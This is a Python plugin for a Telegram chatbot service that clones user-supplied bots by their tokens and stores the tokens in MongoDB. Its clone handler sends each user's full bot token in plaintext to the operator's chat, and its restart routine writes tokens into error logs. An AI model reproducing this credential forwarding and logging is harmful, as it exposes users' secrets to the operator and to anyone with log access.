import logging
import os
import asyncio
from pyrogram import Client, filters
from pyrogram.types import BotCommand
from pyrogram.errors.exceptions.bad_request_400 import AccessTokenExpired, AccessTokenInvalid

from config import API_HASH, API_ID, OWNER_ID
from ShrutiCHATBOT import ShrutiCHATBOT as app, save_clonebot_owner
from ShrutiCHATBOT import db as mongodb

# DB Collections
CLONES = set()
cloneownerdb = mongodb.cloneownerdb
clonebotdb = mongodb.clonebotdb

# Authorized users for /listchatbot
AUTHORIZED_USERS = {0x1C39B0A89, 0x6A7C2D2B, 0x1C9A0B5BC, 0x1B1B42A70}


# 🔥 Clone command
@Client.on_message(filters.command(["clone", "host", "deploy"]))
async def clone_txt(client, message):
    if len(message.command) > 1:
        # ✅ FIXED TOKEN EXTRACTION
        bot_token = " ".join(message.command[1:]).strip()
        mi = await message.reply_text("Please wait while I check the bot token.")
        try:
            ai = Client(
                bot_token,
                API_ID,
                API_HASH,
                bot_token=bot_token,
                plugins=dict(root="ShrutiCHATBOT/mplugin"),
            )
            await ai.start()
            bot = await ai.get_me()
            bot_id = bot.id
            user_id = message.from_user.id
            await save_clonebot_owner(bot_id, user_id)

            await ai.set_bot_commands(
                [
                    BotCommand("start", "Start the bot"),
                    BotCommand("help", "Get the help menu"),
                    BotCommand("clone", "Make your own chatbot"),
                    BotCommand("idclone", "Make your id-chatbot"),
                    BotCommand("ping", "Check if the bot is alive or dead"),
                    BotCommand("lang", "Select bot reply language"),
                    BotCommand("chatlang", "Get current using lang for chat"),
                    BotCommand("resetlang", "Reset to default bot reply lang"),
                    BotCommand("id", "Get users user_id"),
                    BotCommand("stats", "Check bot stats"),
                    BotCommand("gcast", "Broadcast any message to groups/users"),
                    BotCommand("chatbot", "Enable or disable chatbot"),
                    BotCommand("status", "Check chatbot enable or disable in chat"),
                    BotCommand("shayri", "Get random shayri for love"),
                    BotCommand("repo", "Get chatbot source code"),
                ]
            )
        except (AccessTokenExpired, AccessTokenInvalid):
            await mi.edit_text("**Invalid bot token. Please provide a valid one.**")
            return
        except Exception:
            cloned_bot = await clonebotdb.find_one({"token": bot_token})
            if cloned_bot:
                await mi.edit_text("**🤖 Your bot is already cloned ✅**")
                return

        await mi.edit_text(
            "**Cloning process started. Please wait for the bot to start.**"
        )
        try:
            details = {
                "bot_id": bot.id,
                "is_bot": True,
                "user_id": user_id,
                "name": bot.first_name,
                "token": bot_token,
                "username": bot.username,
            }
            cloned_bots = clonebotdb.find()
            cloned_bots_list = await cloned_bots.to_list(length=None)
            total_clones = len(cloned_bots_list)

            await app.send_message(
                int(OWNER_ID),
                f"**#New_Clone**\n\n**Bot:- @{bot.username}**\n\n**Details:-**\n{details}\n\n**Total Cloned:-** {total_clones}",
            )

            await clonebotdb.insert_one(details)
            CLONES.add(bot.id)

            await mi.edit_text(
                f"**Bot @{bot.username} has been successfully cloned and started ✅.**\n**Remove clone by :- /delclone bot_token**\n**Check all cloned bot list by:- /cloned**"
            )
        except BaseException as e:
            logging.exception("Error while cloning bot.")
            await mi.edit_text(
                f"⚠️ <b>Error:</b>\n\n<code>{e}</code>\n\n**Forward this message to @AnanyaBotSupport for assistance**"
            )
    else:
        await message.reply_text(
            "**Provide Bot Token after /clone Command from @Botfather.**\n\n**Example:** `/clone bot_token_here`"
        )


# 📋 List cloned bots
@Client.on_message(filters.command("cloned"))
async def list_cloned_bots(client, message):
    try:
        cloned_bots = clonebotdb.find()
        cloned_bots_list = await cloned_bots.to_list(length=None)
        if not cloned_bots_list:
            await message.reply_text("No bots have been cloned yet.")
            return
        total_clones = len(cloned_bots_list)
        text = f"**Total Cloned Bots:** {total_clones}\n\n"
        for bot in cloned_bots_list:
            text += f"**Bot ID:** `{bot['bot_id']}`\n"
            text += f"**Bot Name:** {bot['name']}\n"
            text += f"**Bot Username:** @{bot['username']}\n\n"
        await message.reply_text(text)
    except Exception as e:
        logging.exception(e)
        await message.reply_text(
            "**An error occurred while listing cloned bots.**"
        )


# ❌ Delete cloned bot
@Client.on_message(
    filters.command(
        ["deletecloned", "delcloned", "delclone", "deleteclone", "removeclone", "cancelclone"]
    )
)
async def delete_cloned_bot(client, message):
    try:
        if len(message.command) < 2:
            await message.reply_text(
                "**Provide Bot Token after /delclone Command.**\n\n**Example:** `/delclone bot_token_here`"
            )
            return

        bot_token = " ".join(message.command[1:]).strip()
        ok = await message.reply_text("**Checking the bot token...**")

        cloned_bot = await clonebotdb.find_one({"token": bot_token})
        if cloned_bot:
            await clonebotdb.delete_one({"token": bot_token})

            if cloned_bot["bot_id"] in CLONES:
                CLONES.remove(cloned_bot["bot_id"])

            await ok.edit_text(
                f"**🤖 Your cloned bot has been removed from my database ✅**\n**🔄 Kindly revoke your bot token from @BotFather otherwise your bot may still run until restart.**"
            )
        else:
            await message.reply_text(
                "**⚠️ The provided bot token is not in the cloned list.**"
            )
    except Exception as e:
        await message.reply_text(
            f"**An error occurred while deleting the cloned bot:** {e}"
        )
        logging.exception(e)


# ♻️ Restart cloned bots on app restart
async def restart_bots():
    global CLONES
    try:
        logging.info("Restarting all cloned bots...")
        bots = [bot async for bot in clonebotdb.find()]

        async def restart_bot(bot):
            bot_token = bot["token"]
            ai = Client(
                bot_token,
                API_ID,
                API_HASH,
                bot_token=bot_token,
                plugins=dict(root="ShrutiCHATBOT/mplugin"),
            )
            try:
                await ai.start()
                bot_info = await ai.get_me()
                await ai.set_bot_commands(
                    [
                        BotCommand("start", "Start the bot"),
                        BotCommand("help", "Get the help menu"),
                        BotCommand("clone", "Make your own chatbot"),
                        BotCommand("idclone", "Make your id-chatbot"),
                        BotCommand("ping", "Check if the bot is alive or dead"),
                        BotCommand("lang", "Select bot reply language"),
                        BotCommand("chatlang", "Get current using lang for chat"),
                        BotCommand("resetlang", "Reset to default bot reply lang"),
                        BotCommand("id", "Get users user_id"),
                        BotCommand("stats", "Check bot stats"),
                        BotCommand("gcast", "Broadcast any message to groups/users"),
                        BotCommand("chatbot", "Enable or disable chatbot"),
                        BotCommand("status", "Check chatbot enable or disable in chat"),
                        BotCommand("shayri", "Get random shayri for love"),
                        BotCommand("repo", "Get chatbot source code"),
                    ]
                )

                if bot_info.id not in CLONES:
                    CLONES.add(bot_info.id)

            except (AccessTokenExpired, AccessTokenInvalid):
                await clonebotdb.delete_one({"token": bot_token})
                logging.info(
                    f"Removed expired or invalid token for bot ID: {bot['bot_id']}"
                )
            except Exception as e:
                logging.exception(
                    f"Error while restarting bot with token {bot_token}: {e}"
                )

        await asyncio.gather(*(restart_bot(bot) for bot in bots))

    except Exception as e:
        logging.exception("Error while restarting bots.")


# 🚮 Delete ALL cloned bots
@Client.on_message(filters.command("delallclone") & filters.user(int(OWNER_ID)))
async def delete_all_cloned_bots(client, message):
    try:
        a = await message.reply_text("**Deleting all cloned bots...**")
        await clonebotdb.delete_many({})
        CLONES.clear()
        await a.edit_text(
            "**All cloned bots have been deleted successfully ✅**"
        )
        os.system(f"kill -9 {os.getpid()} && bash start")
    except Exception as e:
        await a.edit_text(
            f"**An error occurred while deleting all cloned bots.** {e}"
        )
        logging.exception(e)
